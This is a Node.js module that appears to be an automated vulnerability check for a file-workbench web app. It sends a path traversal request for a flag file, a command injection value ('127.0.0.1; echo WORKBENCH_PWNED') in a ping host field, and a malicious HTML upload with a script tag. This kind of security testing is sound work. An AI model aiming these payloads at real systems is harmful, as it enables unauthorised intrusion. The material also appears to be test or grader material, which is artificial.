const axios = require('axios');
const FormData = require('form-data');

const UPLOAD_PAYLOAD = '<script>document.title="pwned"</script>';

function truncate(value) {
  const s = typeof value === 'string' ? value : JSON.stringify(value);
  return s.length > 200 ? s.slice(0, 199) + '…' : s;
}

async function checkTraversal(baseUrl) {
  const res = await axios.get(`${baseUrl}/download`, {
    params: { name: '../secret/flag.txt' },
    timeout: 5000,
    responseType: 'text',
    transformResponse: [(d) => d],
    validateStatus: () => true,
  });
  const body = typeof res.data === 'string' ? res.data : String(res.data);
  return {
    exploited: res.status === 200 && body.includes('FLAG{'),
    summary: `Traversal: ${res.status} ${truncate(body)}`,
  };
}

async function checkCommand(baseUrl) {
  const res = await axios.post(
    `${baseUrl}/ping`,
    { host: '127.0.0.1; echo WORKBENCH_PWNED' },
    {
      headers: { 'Content-Type': 'application/json' },
      timeout: 5000,
      validateStatus: () => true,
    },
  );
  return {
    exploited:
      res.status === 200 &&
      res.data &&
      typeof res.data.output === 'string' &&
      res.data.output.includes('WORKBENCH_PWNED'),
    summary: `Command injection: ${res.status} ${truncate(res.data)}`,
  };
}

async function checkUpload(baseUrl) {
  const form = new FormData();
  form.append('file', Buffer.from(UPLOAD_PAYLOAD), {
    filename: 'malicious.html',
    contentType: 'text/html',
  });

  const upload = await axios.post(`${baseUrl}/upload`, form, {
    headers: form.getHeaders(),
    timeout: 5000,
    validateStatus: () => true,
  });
  if (upload.status >= 400) {
    return { exploited: false, summary: `Upload: ${upload.status}` };
  }

  const storedPath =
    upload.data && typeof upload.data.path === 'string'
      ? upload.data.path
      : '/files/malicious.html';
  const fetched = await axios.get(`${baseUrl}${storedPath}`, {
    timeout: 5000,
    responseType: 'text',
    transformResponse: [(d) => d],
    validateStatus: () => true,
  });
  const contentType = fetched.headers && fetched.headers['content-type'] || '';
  return {
    exploited: fetched.status === 200 && /text\/html/i.test(contentType),
    summary: `Upload fetch: ${fetched.status} Content-Type=${contentType || 'none'}`,
  };
}

async function runFileWorkbenchReviewAttack({ baseUrl }) {
  const start = Date.now();
  const checks = [];

  try {
    try {
      await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
    } catch {}

    checks.push(['path-traversal', await checkTraversal(baseUrl)]);
    checks.push(['command-injection', await checkCommand(baseUrl)]);
    checks.push(['file-upload', await checkUpload(baseUrl)]);

    const hit = checks.find(([, result]) => result.exploited);
    return {
      vulnerability: 'review-file-workbench',
      exploited: Boolean(hit),
      payload: hit ? hit[0] : null,
      evidence: truncate(checks.map(([name, result]) => `${name}: ${result.summary}`).join('; ')),
      durationMs: Date.now() - start,
    };
  } catch (err) {
    return {
      vulnerability: 'review-file-workbench',
      exploited: false,
      payload: null,
      evidence: truncate(`Review attack failed: ${err.message}`),
      durationMs: Date.now() - start,
    };
  } finally {
    try {
      await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
    } catch {}
  }
}

module.exports = { runFileWorkbenchReviewAttack };
